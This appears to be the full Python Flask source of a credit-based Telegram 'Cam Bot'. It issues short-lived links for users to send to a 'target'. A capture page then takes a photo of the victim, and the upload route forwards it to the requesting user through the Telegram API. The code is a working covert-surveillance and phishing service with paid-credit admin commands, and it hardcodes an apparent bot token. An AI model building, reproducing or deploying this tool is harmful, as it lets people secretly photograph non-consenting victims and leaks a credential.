import os
import logging
import uuid
import base64
from io import BytesIO
from flask import Flask, request, send_from_directory, session
import requests
from datetime import datetime, timedelta

# Database import
from database import (
    init_db, get_or_create_user, deduct_credit, save_photo,
    get_user_by_telegram_id, add_credits, log_admin_action,
    create_link, is_link_valid, mark_link_used, get_link_info
)

# Admin import
from admin import admin_bp

TOKEN = "8890650354:AAHG_DYLxeIsZMdTxZneIK7ZzbaOJlGsvyA"
API_URL = "https://api.telegram.org/bot" + TOKEN

RAILWAY_DOMAIN = "web-production-2428c.up.railway.app"
WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
PORT = int(os.environ.get("PORT", 5000))

ADMIN_TELEGRAM_ID = int(os.environ.get("8375820047", 0))

user_tokens = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder="static")
app.secret_key = os.environ.get("Kema", "Kema")

app.register_blueprint(admin_bp)

init_db()

logger.info("=== BOT STARTED ===")
logger.info("DOMAIN: " + RAILWAY_DOMAIN)

# ==================== TELEGRAM API ====================
def send_message(chat_id, text, reply_markup=None):
    url = API_URL + "/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except Exception as e:
        logger.error("send_message error: " + str(e))
        return None

# ==================== WEBHOOK ====================
@app.route("/" + TOKEN, methods=["POST"])
def webhook():
    data = request.get_json()

    if "message" in data and "text" in data["message"]:
        chat_id = data["message"]["chat"]["id"]
        telegram_id = data["message"]["from"]["id"]
        username = data["message"]["from"].get("username", "user")
        text = data["message"]["text"]

        logger.info("CMD: " + text + " from @" + username + " (ID:" + str(telegram_id) + ")")

        user = get_or_create_user(telegram_id, username)
        user_id = user["id"]
        credits = user["credits"]

        # Admin komutlari
        if telegram_id == ADMIN_TELEGRAM_ID:
            if text.startswith("/addcredit "):
                parts = text.split()
                if len(parts) == 3:
                    target_id = int(parts[1])
                    amount = int(parts[2])
                    add_credits(target_id, amount)
                    log_admin_action(ADMIN_TELEGRAM_ID, target_id, "ADD_CREDIT", amount)
                    send_message(chat_id, "Kredi eklendi! Kullanici ID: " + str(target_id) + " +" + str(amount) + " kredi")
                    return "OK", 200
            elif text == "/admin":
                msg = ("Admin Komutlari:\n"
                       "/addcredit [ID] [MIKTAR] - Kredi ekle\n"
                       "/users - Kullanici listesi\n"
                       "Admin Panel: " + WEBHOOK_URL + "/admin")
                send_message(chat_id, msg)
                return "OK", 200
            elif text == "/users":
                from database import get_all_users
                users = get_all_users()
                msg = "Kullanicilar:\n"
                for u in users[:20]:
                    msg += "ID:" + str(u["id"]) + " @" + u["username"] + " Kredi:" + str(u["credits"]) + "\n"
                send_message(chat_id, msg)
                return "OK", 200

        # Normal kullanici komutlari
        if text == "/start":
            if credits <= 0:
                msg = ("Merhaba @" + username + "!\n\n"
                       "Krediniz bitti!\n"
                       "Kredi almak icin admin ile iletisime gecin.\n\n"
                       "Admin: @KEMA_VPN\n"
                       "ID'niz: " + str(user_id))
                send_message(chat_id, msg)
                return "OK", 200

            if not deduct_credit(user_id):
                send_message(chat_id, "Kredi hatasi! Admin ile iletisime gecin.")
                return "OK", 200

            token = str(uuid.uuid4()).replace("-", "")[:16]

            # Link olustur - 10 dakika gecerli
            create_link(user_id, token, minutes=10)

            user_tokens[token] = {"user_id": user_id, "chat_id": chat_id, "username": username}
            link = WEBHOOK_URL + "/c/" + token

            # Bitis zamani
            expires = datetime.now() + timedelta(minutes=10)
            expires_str = expires.strftime("%H:%M")

            msg = ("Merhaba @" + username + "!\n\n"
                   "Link: " + link + "\n\n"
                   "Bu linki hedefe gonder.\n"
                   "Link 10 dakika gecerli (" + expires_str + "'e kadar).\n\n"
                   "Kalan kredi: " + str(credits - 1) + "\n"
                   "ID'niz: " + str(user_id))

            keyboard = {
                "inline_keyboard": [[{"text": "Linke Git", "url": link}]]
            }

            send_message(chat_id, msg, reply_markup=keyboard)

        elif text == "/kredi":
            msg = "Krediniz: " + str(credits) + "\nID'niz: " + str(user_id)
            send_message(chat_id, msg)

        elif text == "/id":
            msg = "Telegram ID: " + str(telegram_id) + "\nKullanici ID: " + str(user_id)
            send_message(chat_id, msg)

    return "OK", 200

# ==================== CAPTURE PAGE ====================
@app.route("/c/<token>")
def capture(token):
    # Link gecerli mi kontrol et
    if not is_link_valid(token):
        return """
        <html>
        <head><title>Link Gecersiz</title></head>
        <body style="background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
            <div>
                <h1>Link Gecersiz veya Suresi Doldu!</h1>
                <p>Bu link 10 dakika gecerliydi ve su an kullanilamaz.</p>
            </div>
        </body>
        </html>
        """, 410

    if token not in user_tokens:
        return "<h1>Link gecersiz!</h1>", 404

    return send_from_directory("static", "capture.html")

# ==================== UPLOAD PHOTO ====================
@app.route("/upload/<token>", methods=["POST"])
def upload_photo(token):
    if token not in user_tokens:
        return {"error": "token"}, 403

    # Link hala gecerli mi?
    if not is_link_valid(token):
        return {"error": "Link suresi doldu"}, 410

    data = request.get_json()
    img = data.get("image", "")
    if not img:
        return {"error": "no image"}, 400

    try:
        img_bytes = base64.b64decode(img.split(",")[1])
    except:
        return {"error": "decode"}, 400

    info = user_tokens[token]
    user_id = info["user_id"]
    chat_id = info["chat_id"]
    username = info["username"]

    # Linki kullanilmis olarak isaretle
    mark_link_used(token)

    # Save to database
    save_photo(user_id, token, img)

    # Send to Telegram
    cap = "Fotograf! @" + username + "\nToken: " + token
    url = API_URL + "/sendPhoto"
    files = {"photo": ("photo.jpg", img_bytes, "image/jpeg")}
    data2 = {"chat_id": chat_id, "caption": cap}
    requests.post(url, files=files, data=data2, timeout=30)

    return {"ok": True}, 200

# ==================== HOME ====================
@app.route("/")
def home():
    return "Cam Bot Aktif - Linkler 10 dakika gecerli"

# ==================== MAIN ====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
